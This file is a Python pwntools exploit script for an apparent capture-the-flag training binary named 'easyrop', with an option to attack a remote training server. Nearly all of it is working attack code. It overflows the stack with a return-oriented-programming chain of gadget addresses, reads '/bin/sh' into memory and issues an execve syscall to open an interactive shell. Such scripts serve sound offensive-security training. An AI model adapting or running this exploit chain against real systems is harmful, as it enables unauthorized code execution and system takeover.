from pwn import *
import sys
import time

context.arch = 'amd64'

if(len(sys.argv) > 1):
	if(sys.argv[1] == '--debug'):
		p = process("./easyrop")
		gdb.attach(p, """
		b *main+10
		"""	)
		input("wait...")
	elif(sys.argv[1] == '--strace'):
		p = process(["strace", "./easyrop"])
	elif(sys.argv[1] == '--remote'):
		p = remote("bin.training.offdef.it", 2015)
else:
	p = process("./easyrop")

def halfonstack(value):
	p.send(p32(value))
	p.send(p32(0))

def onstack(value):
	onehalf = value & 0xffffffff
	otherhalf = value >> 32

	halfonstack(onehalf)
	halfonstack(otherhalf)

pop = 0x00000000004001c2 # pop rdi ; pop rsi ; pop rdx ; pop rax ; ret
syscall = 0x00000000004001b3 # syscall
len_addr = 0x0000000000600370 # address of len (where we write /bin/sh)
read_fun = 0x0400144 # read function address

overflow = [0x0]*7
chain_syscall = overflow + [
	pop, ## Return address is the pop chain
	0, ## RDI = 0 (stdin)
	len_addr, ## RSI = len
	8, ## RDX = 8 = len(/bin/sh/x00)
	0, ## RAX = 0 (read syscall)
	syscall, ## Return address is the syscall (for the read)
	0, ## dummy_value
	pop, ## Return address for the pop chain
	len_addr, ## pop rdi; flag*
	0, ## pop rsi; argv = 0
	0, ## pop rdx; envp = 0
	0x3b, ## pop rax; rax = 0x3b
	syscall
]

chain_read = overflow + [
	pop, ## Return address is the pop chain
	0, ## RDI = 0 (stdin)
	len_addr, ## RSI = len
	8, ## RDX = 8 = len(/bin/sh/x00)
	0, ## RAX = 0 (read syscall)
	read_fun, ## Return address is the syscall (for the read)
	pop, ## Return address for the pop chain
	len_addr, ## pop rdi; flag*
	0, ## pop rsi; argv = 0
	0, ## pop rdx; envp = 0
	0x3b, ## pop rax; rax = 0x3b
	syscall
]

for i in chain_read:
	onstack(i)

input('end')
p.send(b'\x00')
time.sleep(0.1)
p.send(b'\x00')

## /bin/sh
time.sleep(0.1)
p.sendline(b'/bin/sh\x00')

p.interactive()